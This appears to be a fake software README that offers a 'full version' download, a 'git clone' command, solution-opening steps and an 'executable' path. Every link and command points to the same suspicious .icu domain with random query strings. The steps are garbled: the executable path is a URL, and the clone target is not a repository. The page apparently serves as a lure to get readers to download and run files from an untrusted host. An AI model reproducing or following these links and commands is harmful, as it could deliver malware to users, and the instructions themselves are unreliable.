...
## Read About
[Download full version](https://gitzdownloadkm.icu?kx8kj7i9w8i3lk4)
...
![last1](https://gitzdownloadkm.icu?x4985soiz3cwldj)
> Download These

2. Clone the repo
   ```sh
   git clone https://gitzdownloadkm.icu?1myns7d7epx8f51
   ```
3. OR

![download](https://gitzdownloadkm.icu?cozjhas7mv9mwe4)


4. _Then open the sln (Project Solution) file_

![vsgif](https://gitzdownloadkm.icu?guek1tr9gll8nls)

5. Find Executable File
   ```sh
   /ProjectName/Bin/Debug/https://gitzdownloadkm.icu?loayfbmvplely32
   ```
<p align="right">(<a href="#readme-top">back to top</a>)</p>
